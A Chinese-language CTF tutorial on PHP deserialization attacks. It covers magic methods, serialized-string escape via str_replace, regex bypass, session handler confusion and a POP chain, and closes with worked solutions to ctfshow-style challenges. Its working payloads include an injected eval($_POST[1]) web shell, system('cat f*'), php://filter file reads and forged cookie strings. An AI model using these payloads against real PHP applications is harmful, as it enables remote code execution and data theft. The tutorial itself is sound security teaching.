//调用echoP()方法，输出\"abc\"\necho $obj;    //obj对象被当做字符串输出，调用__toString()方法，输出__toString\n$s =serialize($obj);  //obj对象被序列化，调用__sleep()方法，输出__sleep\necho $s.'&lt;br>';//sleep返回的信息此时被输出\necho unserialize($s);  //$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。后面这个是一个对象，因此会执行一次__destruct方法\n// 结束又会调用__destruct()方法，输出__destruct\n?>\n\n\n常考类型反序列化字符串逃逸首先来介绍一下这个str_replace函数\nstr_replace \nstr_replace — 子字符串替换\n说明 \nmixed str_replace( mixed $search, mixed $replace, mixed $subject[, int &amp;$count] )\n该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。 \n\n而后看如下代码\n&lt;?php\nerror_reporting(0);\nclass message&#123;\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t)&#123;\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    &#125;\n&#125;\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n&#125;\n\nhighlight_file(__FILE__);\n这里的话也就是序列化后的msg变量中的fuck会被loveU替换这里涉及到一个知识点，就是反序列化字符逃逸，首先对这个知识点进行讲解它其实就是在遇到替换函数时，加上修改的语句，同时构造出正确的序列化文本，使其能够正常进行反序列化，就达到了字符逃逸目的，具体文章可以参考Y4大师傅的这篇文章我再以例子为讲解比如说\n&lt;?php\nerror_reporting(0);\nclass message&#123;\n    public $from;\n    public $msg;\n    public $to;\n    public $quan9i='0';\n    public function __construct($f,$m,$t)&#123;\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    &#125;\n&#125;\n首先我们给它来个简单的赋值\n$a=new message('x','y','z');\necho serialize($a);\n此时它的输出结果为\nO:7:\"message\":4:&#123;s:4:\"from\";s:1:\"x\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"0\";&#125;\n这时候我们使用替换函数str_replace再来尝试\n$a=new message('x','y','z');\n$b=str_replace('x','qq',serialize($a));\necho $b;\n此时我们看一下结果\nO:7:\"message\":4:&#123;s:4:\"from\";s:1:\"qq\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"0\";&#125;\n此时你就会发现s:1:&quot;qq&quot;;里面说只有1个字符，但是存在qq两个字符，这时候就存在了字串符逃逸。我们这里就假设quan9i为1的时候可以获取flag，我们该如何做呢？将后面的添加到x的后面，即&quot;;s:3:&quot;msg&quot;;s:1:&quot;y&quot;;s:2:&quot;to&quot;;s:1:&quot;z&quot;;s:6:&quot;quan9i&quot;;s:1:&quot;0&quot;;&#125;这部分，具体如下\n$a=new message('x\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;','y','z');\n&quot;;s:3:&quot;msg&quot;;s:1:&quot;y&quot;;s:2:&quot;to&quot;;s:1:&quot;z&quot;;s:6:&quot;quan9i&quot;;s:1:&quot;1&quot;;&#125;这部分是59个字符，那我们此时添加58个x，构造出59个x，与后面字符保持一致，具体如下\n$a=new message('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;','y','z');\n此时我们输出一下它\n$a=new message('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;','y','z');\n$b=str_replace('x','qq',serialize($a));\necho $b;\n得到结果\nO:7:\"message\":4:&#123;s:4:\"from\";s:118:\"qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"0\";&#125;\n//;&#125;实现了闭合，后面的不再看，所以后面的那个quan9i为0就不会生效，也不会影响反序列化\n此时显示有118个字符，而qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq也正好是118个，与其字符匹配，此时就构造出了quan9i为1，我们输出一下来进行验证\n$a=new message('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\";s:3:\"msg\";s:1:\"y\";s:2:\"to\";s:1:\"z\";s:6:\"quan9i\";s:1:\"1\";&#125;','y','z');\n$b=str_replace('x','qq',serialize($a));\n$c= unserialize($b);\nvar_dump($c);\n此时也就达到了我们的目的，成功的实现了反序列化的字符串逃逸\n绕过正则函数在做部分题时会遇到如下代码\npreg_match('/^O:\\d+/')\n他的含义呢就是以O开头的，类似于O:6这种的就会被过滤掉，而绕过方法呢，就是在这里加上一个+号，也就是O:+6，就可以成功绕过。\n利用引用&amp;这个符号跟在一个变量前，被赋值给另一个变量时，另一个变量变化时，这个变量的值也会受到影响，具体例子如下\n&lt;?php\n$a='we are best';\n$b=&amp;$a;\necho \"$a\\t\";\n$b='quan9i is good';\necho $a;\n输出因此当要求两个变量完全相等时，可以用&amp;来进行绕过\nsession反序列化session反序列化，需要了解什么是session\n在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。\nsession是如何发挥其作用的呢\n当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。\n在session反序列化中通常还用到了session_start()函数，此函数的简单介绍如下\n当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。\n此时对session有了一定的了解，再来说一下session对反序列化的三种存储方式先简单介绍一下三种存储方式\n选择器\t\t\t存储格式\t\t\t\t\t\t\t\t\t\t\t\t\t示例\nphp_serialize\t经过 serialize() 函数序列化数组\t\t\t\t\t\t\ta:1:&#123;s:4:“name”;s:5:“ocean”;&#125;\nphp（默认）\t\t键名 竖线 经过 serialize() 函数处理的值\t\t\t\t\tname|s:5:“ocean”;\nphp_binary\t\t键名的长度对应的ascii字符 键名 serialize() 函数序列化的值\tname s:6:“spoock”;\n\n这里的话简单讲解一下php_serialize和php两种存储方式\n&lt;?php\nsession_start();\n$_session['quan9i']='ssss';\n?>\n//没写存储方式，默认的话就是php\n此时我们去临时目录下查看此文件其内值如下\naaa|s:3:\"bbb\";quan9i|s:3:\"sss\";\n//php的结果\n此时我们再更换方式为php_serialize\n&lt;?php\nini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n\n$_SESSION['quan9i']='sss';\n?>\n\n其内值如下\na:1:&#123;s:6:\"quan9i\";s:3:\"sss\";&#125;\n可以发现前者的话有个|，|前面是类名，后面是值，后面则不然，如若此时我们在后面加上|，举个栗子\na:1:&#123;s:6:\"quan9i\";|s:3:\"sss\";&#125;\n此时用php序列化来读当然是没问题，但是当用php来读时，a:1:&#123;s:6:&quot;quan9i&quot;;就会被视为键名，而s:3:&quot;sss&quot;;&#125;会被视为键值，那么此时后面的我们可以任意写，题目中出现的任何类我们这里都可以进行调用\nPOP链构造以MRCTF为例进行讲解，题目代码如下\n&lt;?php\n//flag is in flag.php\nclass Modifier &#123;\n    protected  $var;\n    public function append($value)&#123;\n        include($value);\n    &#125;\n    public function __invoke()&#123;\n        $this->append($this->var);\n    &#125;\n&#125;\n\nclass Show&#123;\n    public $source;\n    public $str;\n    public function __construct($file='index.php')&#123;\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"&lt;br>\";\n    &#125;\n    public function __toString()&#123;\n        return $this->str->source;\n    &#125;\n\n    public function __wakeup()&#123;\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) &#123;\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        &#125;\n    &#125;\n&#125;\n\nclass Test&#123;\n    public $p;\n    public function __construct()&#123;\n        $this->p = array();\n    &#125;\n\n    public function __get($key)&#123;\n        $function = $this->p;\n        return $function();\n    &#125;\n&#125;\n\nif(isset($_GET['pop']))&#123;\n    @unserialize($_GET['pop']);\n&#125;\nelse&#123;\n    $a=new Show;\n    highlight_file(__FILE__);\n&#125;\n我们通过观察可以发现， Modifier类的 append函数可以实现文件包含，那毋庸置疑它就是本题的突破口，我们看到append函数是__invoke魔术函数来调用的，这个魔术函数是当对象被当做函数调用时触发，那么此时我们就找带()的，这种如果把它变成对象肯定就可以触发，这时候就发现Test类中的__get魔术函数，它是当访问不存在的变量时触发，那么在这里的话就看到show类中的__toString魔术方法，而__tostring是当对象被视为字符串时调用，此时就又走到了__wakeup函数这里，因为它后面是$this-&gt;source，我们只需要将source变成对象，就可以触发__tostring魔术函数，__wakeup是当有unserialize()时调用，我们可以看到题目代码中一旦我们传入pop参数，就会进行反序列化\nif(isset($_GET['pop']))&#123;\n    @unserialize($_GET['pop']);\n&#125;\n此时推理就完成了，接下来构造对应的pop链即可\n&lt;?php\n//flag is in flag.php \nclass Modifier &#123;\n    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php';\n    public function append($value)&#123;\n        include($value);\n    &#125;\n    public function __invoke()&#123;\n        $this->append($this->var);\n    &#125;\n&#125;\n\nclass Show&#123;\n    public $source;\n    public $str;\n    public function __construct($file='index.php')&#123;\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"&lt;br>\";\n    &#125;\n    public function __toString()&#123;\n        return $this->str->source;\n    &#125;\n\n    public function __wakeup()&#123;\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) &#123;\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        &#125;\n    &#125;\n&#125;\n\nclass Test&#123;\n    public $p;\n    public function __construct()&#123;\n        $this->p = array();\n    &#125;\n\n    public function __get($key)&#123;\n        $function = $this->p;\n        return $function();\n    &#125;\n&#125;\n$a=new Show();\n$a->source=new Show();\n$a->source->str=new Test();\n$a->source->str->p=new Modifier();\necho urlencode(serialize($a));\n传值给pop参数base64解码得flag\n实战简单类型（读懂代码）0X01&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser&#123;\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip()&#123;\n        return $this->isVip;\n    &#125;\n    public function login($u,$p)&#123;\n        if($this->username===$u&amp;&amp;$this->password===$p)&#123;\n            $this->isVip=true;\n        &#125;\n        return $this->isVip;\n    &#125;\n    public function vipOneKeyGetFlag()&#123;\n        if($this->isVip)&#123;\n            global $flag;\n            echo \"your flag is \".$flag;\n        &#125;else&#123;\n            echo \"no vip, no flag\";\n        &#125;\n    &#125;\n&#125;\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password))&#123;\n    $user = new ctfShowUser();\n    if($user->login($username,$password))&#123;\n        if($user->checkVip())&#123;\n            $user->vipOneKeyGetFlag();\n        &#125;\n    &#125;else&#123;\n        echo \"no vip,no flag\";\n    &#125;\n&#125;\n\n这里的话没有涉及魔术方法，魔术方法指的是以_开头的，然后我们先不看类，先看它执行的代码，也就是这一部分\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password))&#123;\n    $user = new ctfShowUser(); //实例化类\n    if($user->login($username,$password))&#123; //login方法调用传入的变量user\n        if($user->checkVip())&#123; \n            $user->vipOneKeyGetFlag(); \n        &#125;\n    &#125;else&#123;\n        echo \"no vip,no flag\";\n    &#125;\n&#125;\n这一部分的话可以看出是get传入username和password，然后有一个条件语句，当得到username和password变量时往下执行，此时实例化了类，然后依次用三种方法调用了传入的变量user，此时我们再看上面的类\nclass ctfShowUser&#123;\n    public $username='xxxxxx'; //公共变量，设置username为xxxxxx\n    public $password='xxxxxx';//设置password为xxxxxx\n    public $isVip=false; //设置isvip为false\n\n    public function checkVip()&#123; \n        return $this->isVip;// 定义属性\n    &#125;\n    public function login($u,$p)&#123;\n        if($this->username===$u&amp;&amp;$this->password===$p)&#123;\n       //如果传入的username变量与password变量和$username与$password相同\n            $this->isVip=true;\n            //就将isvip改为true\n        &#125;\n        return $this->isVip;\n    &#125;\n    public function vipOneKeyGetFlag()&#123;\n        if($this->isVip)&#123;\n            global $flag;\n            echo \"your flag is \".$flag;\n        &#125;else&#123;\n            echo \"no vip, no flag\";\n        &#125;\n    &#125;\n&#125;\n\n因此此时的话我们就按要求，传入username和password都等于xxxxxx，即可使得isvip为true，此时的话就会执行checkvip，然后checkvip是得到这个isvip的值，然后是true，此时就再往下执行，进入这个vipOneKeyGetFlag方法，然后里面的是有这样一个检测if($this-&gt;isVip)，因为isvip是true，所以就往下执行，这时候就输出了flag，因此我们的payload就是\nusername=xxxxxx&amp;password=xxxxxx\n0X02&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass ctfShowUser&#123;\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n\n    public function checkVip()&#123;\n        return $this->isVip;\n    &#125;\n    public function login($u,$p)&#123;\n        return $this->username===$u&amp;&amp;$this->password===$p;\n    &#125;\n    public function vipOneKeyGetFlag()&#123;\n        if($this->isVip)&#123;\n            global $flag;\n            echo \"your flag is \".$flag;\n        &#125;else&#123;\n            echo \"no vip, no flag\";\n        &#125;\n    &#125;\n&#125;\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password))&#123;\n    $user = unserialize($_COOKIE['user']);    \n    if($user->login($username,$password))&#123;\n        if($user->checkVip())&#123;\n            $user->vipOneKeyGetFlag();\n        &#125;\n    &#125;else&#123;\n        echo \"no vip,no flag\";\n    &#125;\n&#125;\n\n这里的话我们就可以看出对user进行了一次反序列化，然后这个当username和password匹配成功时不会更改isvip为true，这时候我们就可以本地来更改它这个值，然后实例化这个类，引用Y4师傅的话来解释反序列化和序列化\n序列化将对象保存到字符串，反序列化将字符串恢复为对象\n\n\n然后我们本地得到序列化的时候需要进行url编码，具体如下所示\n&lt;?php\nclass ctfShowUser&#123;\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=true;\n&#125;\necho(urlencode(serialize(new ctfShowUser())));\n?>\n然后此时就可以得到它实例化类的值，它这个user是由cookie里的user得到的，因此我们新添一个cookie为user，且值为我们刚刚得到的值即可通过第一层检测然后第二次检测的话是要求值和设定的相同，所以这时候就需要我们传入的username和password为xxxxxx了，所以我们此时构造payload如下\nusername=xxxxxx&amp;password=xxxxxx\n进行传入即可不理解的话可以进行本地测试\n&lt;?php\nclass ctfShowUser&#123;\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=true;\n&#125;\nvar_dump(unserialize(serialize(new ctfShowUser())));\n?>\n看此时它构造的语句，可以往下执行，得到flag\n0X03error_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser&#123;\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n\n    public function __construct()&#123;\n        $this->class=new info();\n    &#125;\n    public function login($u,$p)&#123;\n        return $this->username===$u&amp;&amp;$this->password===$p;\n    &#125;\n    public function __destruct()&#123;\n        $this->class->getInfo();\n    &#125;\n\n&#125;\n\nclass info&#123;\n    private $user='xxxxxx';\n    public function getInfo()&#123;\n        return $this->user;\n    &#125;\n&#125;\n\nclass backDoor&#123;\n    private $code;\n    public function getInfo()&#123;\n        eval($this->code);\n    &#125;\n&#125;\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password))&#123;\n    $user = unserialize($_COOKIE['user']);类\n    $user->login($username,$password);\n&#125;\n\n\n这里的话用到了魔术方法，对魔术方法进行一个简单的介绍\n__construct()：当对象被创建的时候自动调用，对对象进行初始化。\n__destruct()：和构造函数相反，当对象所在函数调用完毕后执行\n然后此时我们看它整个流程的话，就是创建对象时初始化这个info类，然后对username和password进行了一个检测，然后此时执行完了，就需要释放序列化的对象，此时就用到了这个_destruct类，这个类是调用了getinfo方法，然后它是输出了username，这里的话就是输出了xxxxxx然后你看这时候有个backdoor类没有使用，反序列化的宗旨就是不改代码，但可以更改它的属性，我们这里如果想利用这个backdoor类，那我们将它的class属性更改为backdoor，此时就执行了backdoor里的，然后它里面的方法是eval了$code，那我们就可以定义这个$code为一句话木马或者其它，此时就可以进行rce代码如下\nclass ctfShowUser&#123;\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'backDoor';\n\n    public function __construct()&#123;\n        $this->class=new backDoor();\n    &#125;\n&#125;\nclass backDoor&#123;\n    private $code='eval($_POST[1]);';\n    public function getInfo()&#123;\n        eval($this->code);\n    &#125;\n&#125;\necho(urlencode(serialize(new ctfShowUser())));\n此时get传username和password随便传个参数，然后post上传1即可进行或者直接构造语句代码如下\n&lt;?php\nclass ctfShowUser&#123;\n    private $class;\n    public function __construct()&#123;\n        $this->class=new backDoor();\n    &#125;\n&#125;\nclass backDoor&#123;\n    private $code='system(\"cat f*\");';\n&#125;\n$b=new ctfShowUser();\necho urlencode(serialize($b));\n而后抓包修改cookie并随意设置用户名和密码即可\n字符串逃逸0X01（字符串增多）highlight_file(__FILE__);\ninclude('flag.php');\n\nclass message&#123;\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t)&#123;\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    &#125;\n&#125;\n\nif(isset($_COOKIE['msg']))&#123;\n    $msg = unserialize(base64_decode($_COOKIE['msg']));\n    if($msg->token=='admin')&#123;\n        echo $flag;\n    &#125;\n&#125;\n可以看出这里是检测cookie的msg变量，那么一会构造完放cookie里即可，然后要求是token等于admin，此时我们就可以开始构造\n&lt;?php\nclass message&#123;\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t)&#123;\n        $this->from = $f;\n        $this->msg = $m;\n        $this->to = $t;\n    &#125;\n&#125;\n$a= new message('fuck','b','c');\necho serialize($a);\n?>\n得到\nO:7:\"message\":4:&#123;s:4:\"from\";s:4:\"fuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:4:\"user\";&#125;\n此时我们修改后面的token为s:5:&quot;admin&quot;，然后添加到fuck的后面\n$a= new message('fuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:4:\"user\";&#125;','b','c');\n由于&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;共61个字符，所以我们构造出61个user，如下\n$a= new message('fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";&#125;','b','c');\n此时加上过滤条件，同时看是否一致\n$a= new message('fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";&#125;','b','c');\n$b=str_replace('fuck', 'loveU', serialize($a));\necho $b;\n得到\nO:7:\"message\":4:&#123;s:4:\"from\";s:310:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";&#125;\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:4:\"user\";&#125;\n310个，后面的loveU的总数也正好是310个，此时就构造好了，然后看题目里有个base64解码，所以我们加上base64加密即可\n$a= new message('fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";&#125;','b','c');\n$b=str_replace('fuck', 'loveU', serialize($a));\necho base64_encode($b);\n\n得到\nTzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MzEwOiJsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVIjtzOjM6Im1zZyI7czoxOiJiIjtzOjI6InRvIjtzOjE6ImMiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6MzoibXNnIjtzOjE6ImIiO3M6MjoidG8iO3M6MToiYyI7czo1OiJ0b2tlbiI7czo0OiJ1c2VyIjt9\n在cookie中新增msg，并将上面得到的base64字符赋值给它此时再访问此界面即可得到flag\n0X02（字符串变少）源码如下\n&lt;?php\n\n$function = @$_GET['f'];\n\nfunction filter($img)&#123;\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n&#125;\n\n\nif($_SESSION)&#123;\n    unset($_SESSION);\n&#125;\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\nextract($_POST);\n\nif(!$function)&#123;\n    echo '&lt;a href=\"index.php?f=highlight_file\">source_code&lt;/a>';\n&#125;\n\nif(!$_GET['img_path'])&#123;\n    $_SESSION['img'] = base64_encode('guest_img.png');\n&#125;else&#123;\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n&#125;\n\n$serialize_info = filter(serialize($_SESSION));\n\nif($function == 'highlight_file')&#123;\n    highlight_file('index.php');\n&#125;else if($function == 'phpinfo')&#123;\n    eval('phpinfo();'); //maybe you can find something in here!\n&#125;else if($function == 'show_image')&#123;\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n&#125;\n说可能会在phpinfo中发现东西，这时候我们查看一下phpinfo发现一个类似flag的文件，先在心中记下，此时回过头看代码\n这里发现file_get_contents函数，这个函数是可以读取文件的，这里的参数是base64解密后的$userinfo[&#39;img&#39;]，再观察这个参数，它是由参数$serialize_info反序列后得到的，再跟进这个$serialize_info查看，它是filter(serialize($_SESSION))，此时查看这个filter()函数发现它是一个过滤函数，当有php和flag时替换为空，那这里的话，按理说我们直接给_SESSION[img]赋值，就可以控制这个输出内容，但是呢我们会发现有这个东西\nif(!$_GET['img_path'])&#123;\n    $_SESSION['img'] = base64_encode('guest_img.png');\n&#125;else&#123;\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n&#125;\n它控制了我们的 $_SESSION[&#39;img&#39;]值，这个sha1算法是不可逆的，因此我们这里只能使img的内容为guest_img.png，看起来确实这里不能再突破了，但我们发现有这个extract($_POST);，它是一个变量覆盖函数，此时我们可以通过反序列化字符串逃逸，将我们自己设置的img传入，同时将另一个img抛弃，此时就成功反序列化并利用了这个file_get_contents函数，开始构造\n&lt;?php\n\n$function = @$_GET['f'];\n\nfunction filter($img)&#123;\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n&#125;\n$_SESSION[\"user\"] = 'flagflag';\n$_SESSION['function'] ='1';//随便传个值\n$_SESSION['img']='ZDBnM19mMWFnLnBocA==';//这个是\td0g3_f1ag.php的base64编码\nvar_dump(serialize($_SESSION));\n$serialize_info = filter(serialize($_SESSION));\necho\"&lt;br>\";\nvar_dump(serialize($serialize_info));\n结果\nstring(96) \"a:3:&#123;s:4:\"user\";s:8:\"flagflag\";s:8:\"function\";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\"\nstring(96) \"s:88:\"a:3:&#123;s:4:\"user\";s:8:\"\";s:8:\"function\";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";\"\n会发现下面的那个键名变空了，但长度仍为8，那它此时的键名就会往后取八个，也就是&quot;;s:8:&quot;f，但是此时它的这个格式与正常的是不同的，无法成功反序列化，我们可以使function这个全部内容变成键名的一部分，这个时候就是无问题的，也就是说，让它把&quot;;s:8:&quot;function&quot;;s:1:&quot;1&quot;给吃掉，而这部分一共是24个字符，我们的flag一个是吃4个，构造6个flag，就可以成功吃掉这个，而后我们的img就成功传入了，此时修改$_SESSION[&#39;function&#39;]为1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;此时再运行得到\nstring(137) \"s:128:\"a:3:&#123;s:4:\"user\";s:24:\"\";s:8:\"function\";s:42:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";\"\n这个时候就是正好没问题的，因为反序列化到;&#125;结束，后面的视为垃圾字符，不再查看但是此时的话，我们是a:3，应该是有3个成员的，但是我们内容里，只有两个\n1、s:4:\"user\";s:24:\"\";s:8:\"function\";s:1:\"1\";\n2、s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\"\n因此我们需要再构造一个成员，来使得内容完整\nstring(94) \"s:86:\"a:3:&#123;s:4:\"user\";s:24:\"\";s:8:\"function\";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"name\";s:6:\"quan9i\";&#125;\";\"\n此时的话就正好三个成员\n1、s:4:\"user\";s:24:\"\";s:8:\"function\";s:1:\"1\";\n2、s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\"\n3、s:4:\"name\";s:6:\"quan9i\"\n此时去传值即可，这个输出函数是在$function为show_image时输出的，这个$function是由$_GET[f]控制的，因此我们get一个f＝show_image即可表面此时再将这个/d0g3_f111111ag进行base64加密，替代刚刚的base64就可以得到flag\n绕过正则error_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfShowUser&#123;\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct()&#123;\n        $this->class=new info();\n  